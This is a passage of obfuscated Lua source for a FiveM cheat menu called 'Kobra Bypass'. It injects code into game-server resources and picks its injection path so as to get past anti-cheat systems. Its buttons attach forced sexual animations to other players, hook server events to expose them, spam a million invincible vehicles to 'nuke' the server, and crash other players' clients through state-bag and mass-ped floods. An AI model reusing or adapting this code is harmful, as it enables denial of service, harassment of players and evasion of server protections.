                            ]]);break;end end end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v479={};for v588,v589 in pairs(v27) do if v589 then v479[ #v479 + 1 + 0 ]=v588;end end if ( #v479==0) then v267:Notify("error","Kobra","You must select a player first!",1871 + 1129 );return;end for v590,v591 in ipairs(v479) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v591,v591));end v267:Notify("success","Kobra","Attempted to twerk on "   ..  #v479   .. " player(s)." ,4476 -(296 + 180) );end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v480=0;local v481;while true do if ((1 -0)==v480) then if ( #v481==0) then v267:Notify("error","Kobra","You must select a player first!",8645 -5645 );return;end for v806,v807 in ipairs(v481) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v807,v807));end v480=6 -4 ;end if (v480==(734 -(527 + 207))) then v481={};for v808,v809 in pairs(v27) do if v809 then v481[ #v481 + (528 -(187 + 340)) ]=v808;end end v480=1871 -(1298 + 572) ;end if (v480==(4 -2)) then v267:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v481   .. " player(s)." ,4170 -(144 + 26) );break;end end end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v482=0;local v483;local v484;while true do if (v482==(0 + 0)) then v483=GetResourceState("WaveShield")=="started" ;v484=GetResourceState("ReaperV4")=="started" ;v482=2 -1 ;end if (v482==(2 -1)) then if v483 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v484 then MachoInjectThread(0,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end break;end end end},{type="button",label="Mission Row PD",onSelect=function() local v485=0 + 0 ;local v486;local v487;while true do if ((0 -0)==v485) then v486=GetResourceState("WaveShield")=="started" ;v487=GetResourceState("ReaperV4")=="started" ;v485=1;end if (v485==(1 + 0)) then if v486 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v487 then MachoInjectThread(0 + 0 ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end break;end end end},{type="button",label="Pillbox Hospital",onSelect=function() local v488=GetResourceState("WaveShield")=="started" ;local v489=GetResourceState("ReaperV4")=="started" ;if v488 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v489 then MachoInjectThread(686 -(339 + 347) ,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end end},{type="button",label="Grove Street",onSelect=function() local v490=0 -0 ;local v491;local v492;while true do if (v490==(3 -2)) then if v491 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v492 then MachoInjectThread(0,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end break;end if (0==v490) then v491=GetResourceState("WaveShield")=="started" ;v492=GetResourceState("ReaperV4")=="started" ;v490=377 -(365 + 11) ;end end end},{type="button",label="Legion Square",onSelect=function() local v493=GetResourceState("WaveShield")=="started" ;local v494=GetResourceState("ReaperV4")=="started" ;if v493 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v494 then MachoInjectThread(0 + 0 ,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v60("Choose Menu Key","",function(v592) for v637,v638 in pairs(v45) do if (v638:lower()==v592:lower()) then v23=v638;Wait(1174 -(837 + 87) );v12:ShowUI();return;end end end,"keybind");end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=1671 -(837 + 833) ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=1389 -(1307 + 81) ,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=1 -0 ;v15=1;end;local function v97(v268) for v495,v496 in ipairs(v16) do if (v496.label=="Server") then for v738,v739 in ipairs(v496.categories) do if (v739.label=="Triggers") then local v862=166 -(90 + 76) ;while true do if (v862==0) then v739.tabs[ #v739.tabs + 1 ]=v268;return;end end end end end end end v12.UpdateTabChecked=function(v269,v270,v271,v272) for v497,v498 in pairs(v270 or {} ) do if ((v498.label==v271) and ((v498.type=="checkbox") or (v498.type=="slider-checkbox") or v498.type:find("checkbox"))) then v498.checked=v272;elseif (v498.type=="subMenu") then if v498.categories then for v1045,v1046 in pairs(v498.categories) do v269:UpdateTabChecked(v1046.tabs,v271,v272);end end if v498.subTabs then v269:UpdateTabChecked(v498.subTabs,v271,v272);end end end end;v12.ShowKeybindList=function(v273,v274) v273:SendMessage({action="displayBinds",visible=true,binds=v274});end;v12.HideKeybindList=function(v275) v275:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v276,v277,v278,v279) local v280=0;local v281;local v282;local v283;while true do if (v280==(3 -2)) then v278=v278 or (172 + 178) ;if ( not v282 or  not DoesEntityExist(v282) or  not IsPlayerPlaying(PlayerId())) then local v810=0 + 0 ;while true do if (v810==0) then v281={};return v281;end end end v280=2;end if (v280==(0 + 0)) then v281={};v282=PlayerPedId();v280=3 -2 ;end if ((263 -(197 + 63))==v280) then if ( #v281==(0 + 0)) then v281={};end return v281;end if (v280==2) then v283=GetActivePlayers();if v283 then for v863,v864 in ipairs(v283) do if (v279 or (v864~=PlayerId())) then local v1047=GetPlayerPed(v864);if (v1047 and DoesEntityExist(v1047) and IsEntityAPed(v1047) and  not IsEntityDead(v1047)) then local v1159=0;local v1160;while true do if (v1159==(0 + 0)) then v1160=GetEntityCoords(v1047);if v1160 then local v1312= #(v277-v1160);if (v1312<=v278) then v281[ #v281 + 1 + 0 ]={name=GetPlayerName(v864),serverId=GetPlayerServerId(v864)};end end break;end end end end end else local v811=0 + 0 ;local v812;local v813;local v814;while true do if (v811==(0 -0)) then v812,v813=FindFirstPed();v814=nil;v811=1;end if (v811==1) then repeat local v1127=0;while true do if (v1127==0) then if (v813 and IsPedAPlayer(v813) and DoesEntityExist(v813)) then local v1303=NetworkGetPlayerIndexFromPed(v813);if ((v1303~= -(1370 -(618 + 751))) and (v279 or (v1303~=PlayerId()))) then local v1349=0;local v1350;while true do if (v1349==0) then v1350=GetEntityCoords(v813);if v1350 then local v1557=0 + 0 ;local v1558;while true do if (v1557==(1910 -(206 + 1704))) then v1558= #(v277-v1350);if (v1558<=v278) then v281[ #v281 + (1 -0) ]={name=GetPlayerName(v1303),serverId=GetPlayerServerId(v1303)};end break;end end end break;end end end end v814,v813=FindNextPed(v812);break;end end until  not v814 EndFindPed(v812);break;end end end v280=3;end end end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(1000);v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",3000);Wait(1996 -996 );v12:Notify("info","Kobra","Hello Kobra Menu user, thanks for using Kobra Bypass!",3000);Wait(437 + 563 );if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v97({type="button",label="DeFXAP Events",onSelect=function() local v640=0;local v641;local v642;local v643;while true do if (v640==(1278 -(155 + 1120))) then v643=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v49(v641,v643);MachoMenuNotification("Injector","Hooks injected into ^3"   .. v641   .. "^7 successfully!" );v640=4;end if (v640==(1506 -(396 + 1110))) then v12:HideUI();v641=nil;v642=false;v640=1;end if (v640==4) then v12:ShowUI();break;end if (v640==(2 -1)) then SetNuiFocus(true,true);SetNuiFocusKeepInput(true);v60("Resource Name","",function(v952) local v953=0 + 0 ;while true do if ((0 + 0)==v953) then if (v952 and (v952~="")) then v641=v952;end v642=true;v953=1 + 0 ;end if ((977 -(230 + 746))==v953) then SetNuiFocus(false,false);SetNuiFocusKeepInput(false);break;end end end,"typeable");v640=603 -(473 + 128) ;end if (v640==2) then while  not v642 do Wait(148 -(39 + 9) );end if ( not v641 or (v641=="")) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();return;end if (GetResourceState(v641)~="started") then MachoMenuNotification("Error","Resource ^3"   .. v641   .. "^7 is not started or doesn’t exist." );v12:ShowUI();return;end v640=269 -(38 + 228) ;end end end});end v97({type="button",label="Nuke Server (Medium Risk",onSelect=function() local v499=0 -0 ;local v500;local v501;local v502;while true do if (v499==(476 -(106 + 367))) then v12:ShowUI();break;end if (v499==(1 + 0)) then v500=1000000;v501={"tug","kosatka","cargoplane"};v499=2;end if (v499==(2 + 0)) then v502=1000;Citizen.CreateThread(function() local v815=PlayerPedId();local v816=GetEntityCoords(v815);for v865,v866 in ipairs(v501) do RequestModel(GetHashKey(v866));while  not HasModelLoaded(GetHashKey(v866)) do Citizen.Wait(0);end for v954=1,v500 do local v955=v816.x + math.random( -v502,v502) ;local v956=v816.y + math.random( -v502,v502) ;local v957=v816.z + math.random(0,134 -34 ) ;local v958=math.random(1244 -(334 + 910) ,360);local v959=CreateVehicle(GetHashKey(v866),v955,v956,v957,v958,true,false);SetEntityAsMissionEntity(v959,true,true);SetVehicleOnGroundProperly(v959);SetEntityInvincible(v959,true);Citizen.Wait(895 -(92 + 803) );end SetModelAsNoLongerNeeded(GetHashKey(v866));end end);v499=3;end if (v499==(0 + 0)) then v12:HideUI();MachoMenuNotification("KOBRA","Initiating server nuke via vehicle spam...",1186 -(1035 + 146) );v499=617 -(230 + 386) ;end end end});if (GetResourceState("ox_lib")=="started") then v97({type="button",label="CRASH PLAYERS",onSelect=function() local v644=0;while true do if ((0 + 0)==v644) then if (GetResourceState("WaveShield")=="started") then local v1048=1510 -(353 + 1157) ;while true do if (v1048==(1114 -(53 + 1061))) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",4635 -(1568 + 67) );return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if (GetResourceState("monitor")=="started") then v97({type="button",label="CRASH PLAYERS 2",onSelect=function() local v645=0 + 0 ;while true do if (v645==0) then if (GetResourceState("WaveShield")=="started") then local v1049=0 + 0 ;while true do if (v1049==(0 -0)) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",8826 -5826 );return;end end end MachoInjectResource((MachoResourceInjectable("ReaperV4") and "ReaperV4") or (MachoResourceInjectable("FiniAC") and "FiniAC") or (MachoResourceInjectable("WaveShield") and "WaveShield") or (MachoResourceInjectable("monitor") and "monitor") or "any" ,[[
                local function sfehwq34rw7td()
                    local Nwq7sd2Lkq0pHkfa = CreateThread
                    Nwq7sd2Lkq0pHkfa(function()
                        local hAx9qTeMnb = CreateThread
                        local Jf9uZxcTwa = _G.CreatePed           -- Creates a pedestrian (NPC)
                        local VmzKo3sRt7 = _G.PlayerPedId         -- Gets the player's ped ID
                        local LuZx8nqTys = _G.GetEntityCoords     -- Gets entity coordinates
                        local QksL02vPdt = _G.GetEntityHeading    -- Gets entity heading
                        local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset -- Sets entity coordinates
                        local PfQsXoEr6b = _G.GiveWeaponToPed    -- Gives a weapon to a ped
                        local WvNay7Zplm = _G.TaskParachute       -- Makes a ped use a parachute
                        local DjRq08bKxu = _G.FreezeEntityPosition -- Freezes entity position
                        local EkLnZmcTya = _G.GetHashKey         -- Gets a model hash key
                        local YdWxVoEna3 = _G.RequestModel       -- Requests a model to load
                        local GcvRtPszYp = _G.HasModelLoaded     -- Checks if a model is loaded
                        local MnVc8sQaLp = _G.SetEntityAsMissionEntity -- Marks entity as mission-related
                        local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded -- Frees model from memory
                        local VdNzWqbEyf = _G.DoesEntityExist    -- Checks if an entity exists
                        local AxWtRuLskz = _G.DeleteEntity       -- Deletes an entity
                        local OplKvms9te = _G.Wait               -- Pauses execution for a specified time
                        local BnQvKdsLxa = _G.GetGroundZFor_3dCoord -- Gets ground Z-coordinate
                        local VmxrLa9Ewt = _G.ApplyForceToEntity -- Applies force to an entity
                        local fwafWAefAg = _G.SetEntityVisible   -- Sets entity visibility
                        local awrt325etd = _G.SetBlockingOfNonTemporaryEvents -- Blocks non-temporary events
                        local awfaw4eraq = _G.SetEntityAlpha     -- Sets entity transparency
                        hAx9qTeMnb(function()
                            -- Get the player's ped and its coordinates/heading
                            local QxoZnmWlae = VmzKo3sRt7() -- Player's ped
                            local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae) -- Player's coordinates
                            local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae) -- Player's heading
                            local ZtXmqLpEas = EzPwqLtYas.z + 1600.0 -- Set Z-coordinate 1600 units above
                            -- Teleport player to high altitude
                            Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)
                            -- Apply downward force to simulate falling
                            VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, -5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                            -- Wait 250ms to allow the fall to start
                            OplKvms9te(250)
                            -- Freeze player in place
                            DjRq08bKxu(QxoZnmWlae, true)
                            -- Equip player with a parachute
                            PfQsXoEr6b(QxoZnmWlae, "gadget_parachute", 1, false, true)
                            WvNay7Zplm(QxoZnmWlae, false) -- Trigger parachute task
                            -- Freeze player again to prevent movement
                            DjRq08bKxu(QxoZnmWlae, true)
                            -- Load the "player_one" (Franklin) model
                            local UixZpvLoa9 = EkLnZmcTya("player_one")
                            YdWxVoEna3(UixZpvLoa9)
                            -- Wait until the model is loaded
                            while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end
                            -- Create a table to store created peds
                            local TzsPlcxQam = {}
                            -- Spawn 130 invisible peds at the player's location
                            for K9wo = 1, 130 do
                                local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
                                if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
                                    MnVc8sQaLp(IuxErv7Pqa, true, true) -- Mark ped as mission entity
                                    awrt325etd(IuxErv7Pqa, true) -- Block non-temporary events
                                    awfaw4eraq(IuxErv7Pqa, 0, true) -- Make ped invisible
                                    table.insert(TzsPlcxQam, IuxErv7Pqa) -- Store ped in table
                                end
                                OplKvms9te(1) -- Small delay to prevent freezing
                            end
                            -- Release the model from memory
                            KrXpTuwq9c(UixZpvLoa9)
                            -- Wait 300ms before cleaning up
                            OplKvms9te(300)
                            -- Delete all created peds (repeated calls may be for reliability)
